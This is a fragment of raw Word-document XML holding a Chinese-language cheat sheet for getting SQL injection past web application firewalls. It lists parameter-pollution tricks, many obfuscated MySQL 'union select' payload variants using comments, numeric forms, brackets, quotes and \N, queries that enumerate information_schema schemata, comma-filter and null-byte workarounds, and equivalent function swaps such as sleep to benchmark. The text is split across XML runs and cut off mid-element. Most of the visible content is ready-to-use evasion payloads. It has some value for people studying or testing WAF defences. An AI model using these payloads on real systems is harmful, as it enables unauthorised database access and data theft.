        <w:t>asp.net + iis</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>id=1,2,3</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:ind w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>asp + iis</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>id=1,2,3</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:ind w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>php+ apache</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>id=3</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>利用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>gpc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>进行</w:t>
      </w:r>
      <w:r>
        <w:t>污染</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:ind w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>利用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>gpc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>多次</w:t>
      </w:r>
      <w:r>
        <w:t>赋值参数</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，经比较，数据到达速度的是获得，</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:ind w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>最快，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>第二，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>COOKIE</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>第三。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>DB</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>层</w:t>
      </w:r>
      <w:r>
        <w:t>Bypass(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>参考</w:t>
      </w:r>
      <w:r>
        <w:t>君立华域</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>waf</w:t>
      </w:r>
      <w:r>
        <w:t>bypass.pdf</w:t>
      </w:r>
      <w:r>
        <w:object w:dxaOrig="1531" w:dyaOrig="1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5pt;height:45pt" o:ole="">
            <v:imagedata r:id="rId54" o:title=""/>
          </v:shape>
          <o:OLEObject Type="Embed" ProgID="Acrobat.Document.11" ShapeID="_x0000_i1025" DrawAspect="Icon" ObjectID="_1565768746" r:id="rId55"/>
        </w:object>
      </w:r>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="59"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>ysql</w:t>
      </w:r>
      <w:r>
        <w:t>的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>bypass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rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>参数</w:t>
      </w:r>
      <w:r>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>union</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>之间</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:left="420"/>
      </w:pPr>
      <w:r>
        <w:t>select * from user_listwhere uid=1.0union select 1,2,3,4,5</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:left="420"/>
      </w:pPr>
      <w:r>
        <w:t>select * from user_listwhere uid=1E0union select 1,2,3,4,5</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:left="420"/>
      </w:pPr>
      <w:r>
        <w:t>select * from user_listwhere uid=1\Nunionselect 1,2,3,4,5</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:left="420" w:firstLineChars="0"/>
      </w:pPr>
      <w:r>
        <w:t>select * from user_listwhere uid=1/*!5000union*/ select 1,2,3,4,5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U</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>nion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之间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使用括号</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:ind w:left="840" w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:t>select * from user_listwhere uid=1 union(select 1,2,3,4,5)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U</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>nion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之后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其他方式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括号：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>select * from user_listwhere uid=1 union select(1),2,3,4,5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加号：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>select * from user_listwhere uid=1 union select+1,2,3,4,5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减号：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>select * from user_listwhere uid=1 union select-1,2,3,4,5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~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select~1,2,3,4,5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 xml:space="preserve">! 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select!1,2,3,4,5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@`</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>形式</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>`</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>select * from user_listwhere uid=1 union select@`1`,2,3,4,5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*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select/*!5000*/,2,3,4,5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单引号：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>select * from user_listwhere uid=1 union select'1',2,3,4,5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双引号：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>select * from user_listwhere uid=1 union select"1",2,3,4,5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{</w:t>
      </w:r>
      <w:r>
        <w:t>}</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>括号：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>select * from user_listwhere uid=1 union select{x 1},2,3,4,5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\N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>符号</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>: select * from user_listwhere uid=1 union select\N,2,3,4,5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和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>之间</w:t>
      </w:r>
      <w:r>
        <w:t>的位置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其他方式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`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 `schema_name`frominformation_schema.schematalimit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+,-,!,~,',"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1,2,3,4,(select+schema_namefrom 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lastRenderedPageBreak/>
        <w:t>*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1,2,3,4,(/*!5000select*/schema_namefrom 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{</w:t>
      </w:r>
      <w:r>
        <w:t>}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1,2,3,4,(select{x schema_name} from information_schema.schematalimit 1);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:ind w:left="840" w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>()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1,2,3,4,(select(schema_name)from information_schema.schematalimit 1)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和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>之后</w:t>
      </w:r>
      <w:r>
        <w:t>的位置</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:ind w:left="840"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>1.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>使用空白符</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:ind w:left="840"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>2.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>使用注释</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:ind w:left="840" w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:t>/**/</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:ind w:left="840" w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:t>/*letmetest*/</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:ind w:left="840"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>3.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>其他方式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`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 `schema_name`frominformation_schema.schematalimit 1);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*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1,2,3,4,(/*!5000select*/schema_namefrom information_schema.schematalimit 1);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{}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1,2,3,4,(select{x schema_name} from information_schema.schematalimit 1);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:ind w:leftChars="600" w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>号：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>select * from user_listwhere uid=1 union select 1,2,3,4,(select(schema_name)from information_schema.schematalimit 1)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rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>常用</w:t>
      </w:r>
      <w:r>
        <w:t>的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>字符串</w:t>
      </w:r>
      <w:r>
        <w:t>截取函数、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>拼接</w:t>
      </w:r>
      <w:r>
        <w:t>函数</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>、字符</w:t>
      </w:r>
      <w:r>
        <w:t>转换函数</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="35"/>
        </w:numPr>
        <w:ind w:firstLineChars="0"/>
        <w:outlineLvl w:val="3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>过滤逗号</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:ind w:left="420" w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>limit</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>处的逗号：</w:t>
      </w:r>
      <w:r>
        <w:t>limit 1 offset 0</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1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字符串截取处的逗号：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>mid</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>处的逗号：</w:t>
      </w:r>
      <w:r>
        <w:t>mid(version() from 1 for 1)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRPr="00BA22DE" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:ind w:left="420" w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>3.union</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>处的逗号：使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>join</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>连接</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRPr="00B75BE3" w:rsidRDefault="00912F6A" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r w:rsidRPr="00B75BE3">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>使用空字节</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:tab/>
        <w:t>%00</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>是原生过滤器（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>C++</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>过滤器）认为的字符串终止符</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BA3B72" w:rsidRPr="00B75BE3" w:rsidRDefault="00BA3B72" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r w:rsidRPr="00B75BE3">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>等价</w:t>
      </w:r>
      <w:r w:rsidRPr="00B75BE3">
        <w:t>函数与命令</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0031513A" w:rsidRDefault="0031513A" w:rsidP="00B3563C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函数</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BA3B72" w:rsidRDefault="00BA3B72" w:rsidP="0031513A">
      <w:pPr>
        <w:ind w:leftChars="300" w:left="630" w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>hex()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>bin() ==&gt; ascii()</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BA3B72" w:rsidRDefault="00BA3B72" w:rsidP="0031513A">
      <w:pPr>
        <w:ind w:leftChars="300" w:left="630" w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:t>sleep() ==&gt;benchmark()</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BA3B72" w:rsidRDefault="00BA3B72" w:rsidP="0031513A">
      <w:pPr>
        <w:ind w:leftChars="300" w:left="630" w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:t>concat_ws()==&gt;group_concat()</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BA3B72" w:rsidRDefault="00BA3B72" w:rsidP="0031513A">
      <w:pPr>
        <w:ind w:leftChars="300" w:left="630" w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>mid()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>substr() ==&gt; substring()</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B27D92" w:rsidRDefault="00B27D92" w:rsidP="0031513A">
      <w:pPr>
        <w:ind w:leftChars="300" w:left="630" w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>其他表示方式</w:t>
      </w:r>
      <w:r w:rsidR="00B50F25">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>(mysql)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B27D92" w:rsidRDefault="00B27D92" w:rsidP="0031513A">
      <w:pPr>
        <w:ind w:leftChars="300" w:left="630" w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>substring([string],[pos],[len])==</w:t>
      </w:r>
      <w:r w:rsidR="008948CF">
        <w:t>substring([string] from [pos] for [len])</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008948CF" w:rsidRDefault="008948CF" w:rsidP="0031513A">
      <w:pPr>
        <w:ind w:leftChars="300" w:left="630" w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>mid([string],[start])==mid([string] from [start])</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BA3B72" w:rsidRDefault="00BA3B72" w:rsidP="0031513A">
      <w:pPr>
        <w:ind w:leftChars="300" w:left="630" w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:t>@@user ==&gt; user()</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BA3B72" w:rsidRDefault="00BA3B72" w:rsidP="0031513A">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:leftChars="500" w:left="1050" w:firstLineChars="0" w:firstLine="0"/>
      </w:pPr>
      <w:r>
        <w:t>@@datadir ==&gt; datadir()</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0031513A" w:rsidRDefault="0031513A" w:rsidP="00B3563C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符号</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0031513A" w:rsidRDefault="0031513A" w:rsidP="0031513A">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:left="1260" w:firstLineChars="0" w:firstLine="0"/>
      </w:pPr>
      <w:r>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>nd</w:t>
      </w:r>
      <w:r>
        <w:t>==&gt;&amp;&amp;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0031513A" w:rsidRDefault="0031513A" w:rsidP="0031513A">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:left="1260" w:firstLineChars="0" w:firstLine="0"/>
      </w:pPr>
      <w:r>
        <w:t>Or==&gt;||</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0031513A" w:rsidRDefault="0031513A" w:rsidP="0031513A">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:left="1260" w:firstLineChars="0" w:firstLine="0"/>
      </w:pPr>
      <w:r>
        <w:t>= =</w:t>
      </w:r>
      <w:r w:rsidR="00697C07">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>==&gt;&lt;&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00397A60" w:rsidRDefault="00397A60" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>数据拼接</w:t>
      </w:r>
      <w:r>
        <w:t>函数</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00397A60" w:rsidRDefault="00397A60" w:rsidP="00397A60">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:left="840" w:firstLineChars="0" w:firstLine="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>功能</w:t>
      </w:r>
      <w:r>
        <w:t>是将多</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>条</w:t>
      </w:r>
      <w:r>
        <w:t>数据拼接为一条数据。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00397A60" w:rsidRPr="00397A60" w:rsidRDefault="00397A60" w:rsidP="00397A60">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:left="840" w:firstLineChars="0" w:firstLine="0"/>
      </w:pPr>
      <w:r>
        <w:t>Concat()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>group_concat()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>concat_ws()</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0031513A" w:rsidRPr="00B75BE3" w:rsidRDefault="005B6217" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r w:rsidRPr="00B75BE3">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>利用</w:t>
      </w:r>
      <w:r w:rsidRPr="00B75BE3">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>group by</w:t>
      </w:r>
      <w:r w:rsidRPr="00B75BE3">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidRPr="00B75BE3">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>limit</w:t>
      </w:r>
      <w:r w:rsidRPr="00B75BE3">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="00B75BE3">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>with rollup</w:t>
      </w:r>
      <w:r w:rsidR="002756B5" w:rsidRPr="00B75BE3">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>对</w:t>
      </w:r>
      <w:r w:rsidR="005B715E" w:rsidRPr="00B75BE3">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>数据</w:t>
      </w:r>
      <w:r w:rsidR="002756B5" w:rsidRPr="00B75BE3">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>库</w:t>
      </w:r>
      <w:r w:rsidR="005B715E" w:rsidRPr="00B75BE3">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>某</w:t>
      </w:r>
      <w:r w:rsidR="005B715E" w:rsidRPr="00B75BE3">
        <w:t>列值</w:t>
      </w:r>
      <w:r w:rsidR="002756B5" w:rsidRPr="00B75BE3">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>进行</w:t>
      </w:r>
      <w:r w:rsidRPr="00B75BE3">
        <w:t>绕过</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005B6217" w:rsidRDefault="00132BB5" w:rsidP="005B6217">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:left="840" w:firstLineChars="0" w:firstLine="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
